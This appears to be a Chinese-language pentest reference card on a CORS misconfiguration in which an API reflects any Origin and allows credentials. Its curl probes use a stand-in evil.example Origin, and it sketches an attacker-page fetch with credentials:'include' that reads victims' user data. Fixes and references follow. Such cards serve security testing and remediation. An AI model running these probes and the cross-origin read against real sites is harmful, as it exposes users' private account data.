---
title: CORS 配置错误（带凭据读他人接口数据）
cve: 无（配置缺陷）
severity: high
cvss: 8.1
product: 自研 API（回显 Origin + ACAC:true）
versions: 任意
ports: 80, 443
keywords: cors, 跨域, 带凭据, origin, 泄露
entry: 反射 Origin 且 Allow-Credentials: true
verified: false
sources: 公开资料整理（配置缺陷类）
---

## 指纹

```bash
curl -s -D- -o /dev/null 'https://target/api/user/info' -H 'Origin: https://evil.example' | grep -i 'access-control'
```

## 前置条件

- API 用 Cookie 认证；CORS 回显任意 Origin 并允许凭据。

## PoC

```bash
# 1) 判定
curl -s -D- -o /dev/null 'https://target/api/user/info' -H 'Origin: https://evil.example' \
  | grep -iE 'access-control-allow-(origin|credentials)'
# 返回 ACAO: https://evil.example + ACAC: true = 命中

# 2) 用 null Origin 再试（部分网关只拦非 null）
curl -s -D- -o /dev/null 'https://target/api/user/info' -H 'Origin: null' | grep -i access-control

# 3) 验证可利用：诱导受害者打开页面后读接口
#    attacker 页面 fetch('https://target/api/user/info',{credentials:'include'})
```

## 利用步骤

1. 先看响应头（只读）；
2. 确认被反射的 Origin + `ACAC:true`；
3. 构造 PoC 页面（本地打开即可）证明能读到用户数据；
4. 证据：两行响应头 + 页面读取到的字段。

## 修复与缓解

- Origin 白名单；敏感接口禁 `ACAC:true`；CSRF token / SameSite。

## 参考

- OWASP CORS 配置指南；CWE-942。
